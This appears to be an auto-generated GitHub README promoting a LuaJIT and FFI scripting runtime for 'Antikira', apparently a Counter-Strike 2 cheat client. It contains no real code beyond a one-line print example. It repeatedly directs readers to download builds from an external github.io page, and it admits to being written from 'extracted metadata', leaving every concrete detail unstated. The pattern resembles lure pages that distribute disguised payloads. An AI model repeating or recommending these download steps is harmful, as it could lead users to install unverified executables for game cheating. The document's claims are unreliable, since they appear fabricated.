# Antikira LuaJIT Scripting API - Game Script Utility 2026

> **A Windows LuaJIT scripting API for Antikira and CS2, featuring an embedded Lua runtime, FFI access, and tools for handling scripts from inside the game.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/willqfogcooper4640/antikira-lua-ffi-script-tools?style=flat-square)](https://github.com/willqfogcooper4640/antikira-lua-ffi-script-tools)

---

<p align="center">
  <a href="https://willqfogcooper4640.github.io/antikira-lua-ffi-script-tools/">
    <img src="https://img.shields.io/badge/Download-Antikira%20LuaJIT%20Scripting%20API%20Script-brightgreen?style=for-the-badge" alt="Download Antikira LuaJIT Scripting API Script">
  </a>
</p>

> **[Download Antikira LuaJIT Scripting API](https://willqfogcooper4640.github.io/antikira-lua-ffi-script-tools/)**

---

[Download Latest Build](https://willqfogcooper4640.github.io/antikira-lua-ffi-script-tools/)

---

## What This Project Provides

Antikira LuaJIT Scripting API adds a LuaJIT-powered scripting environment to Antikira and Counter-Strike 2 on Windows. Supported scripts can use Lua and FFI functionality, while an in-game menu provides a way to load and manage them.

Alongside the runtime, the project contains its documentation and build-related tools. LuaJIT is incorporated into the build process, and the Markdown reference can be published through GitHub Pages for easier access while configuring or developing scripts.

---

## Included Capabilities

- LuaJIT embedded for supported Antikira CS2 environments
- Lua-based script creation and organization
- FFI access for scripts that use compatible foreign-function interfaces
- In-game controls for managing available scripts
- Automated LuaJIT handling within the build workflow
- Markdown documentation covering the API and project usage
- Support for deploying documentation through GitHub Pages

---

## Getting Started

1. Visit the [latest build page](https://willqfogcooper4640.github.io/antikira-lua-ffi-script-tools/).
2. Download the Antikira LuaJIT Scripting API files supplied there.
3. Read the included instructions to determine the required installation and script paths.
4. Copy your Lua scripts into the directory specified by the installation.
5. Launch the supported Antikira CS2 environment and open its script management menu.
6. Use the in-game interface to load and organize scripts.

For a minimal starting script, create a file such as:

```lua
-- example.lua
print("LuaJIT script loaded")
```

The project documentation describes the API functions, FFI definitions, and script directories available for each build.

---

## Configuration Areas

The extracted metadata does not specify a permanent list of hotkeys or user-facing switches. The controls shown in practice can vary according to the selected build and the scripts loaded into it.

| Area | Description |
|---|---|
| Script management | Load and arrange supported Lua scripts through the in-game menu. |
| LuaJIT runtime | Execute scripts using the integrated LuaJIT layer. |
| FFI | Access FFI features when they are supported by the runtime and required by the script. |
| Documentation | Use the Markdown reference or its GitHub Pages deployment for API information. |
| Build integration | LuaJIT build processing is part of the project workflow. |

---

## Supported Environment

- **Target:** Antikira and Counter-Strike 2
- **Platform:** Windows
- **Runtime:** LuaJIT with Lua and FFI support
- **Documentation:** Markdown and GitHub Pages deployment

The available project information does not list exact CS2 build identifiers or Antikira release versions. As the target environment, scripting interface, or API evolves, compatibility may change. Review the current documentation and build notes before modifying or upgrading scripts.

---

## Frequently Asked Questions

### Where can I download the newest build?

Follow the [Download Latest Build](https://willqfogcooper4640.github.io/antikira-lua-ffi-script-tools/) link above and choose the files associated with the current release.

### What directory contains the Lua scripts?

The build documentation and installation instructions identify the expected script directory. That location can differ between environments, so use the path specified for the build you installed.

### Can existing scripts be modified?

Yes. Lua scripts may be edited using the API exposed by the selected build. Any FFI-related changes must use definitions and interfaces compatible with that build.

### Is LuaJIT bundled into the project?

The project provides automatic LuaJIT build integration. Build-specific requirements and details are documented with the project.

### Will every script be able to use FFI?

FFI is included as part of the API, but scripts must use definitions and interfaces that the installed runtime supports. Check the documentation before introducing FFI-dependent code.

### What CS2 versions work with this API?

CS2 is identified as a target, but the extracted project details do not name particular game or Antikira versions. Consult the latest documentation and release information for version-specific guidance.

### How is the documentation published?

The documentation is maintained in Markdown and may be deployed through GitHub Pages. When supplied by the current build, the published reference is reachable from the project download page.

### Where are scripts and settings saved?

Their locations are determined by the installation and by the scripts being used. Follow the instructions for the selected build instead of relying on a default directory.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
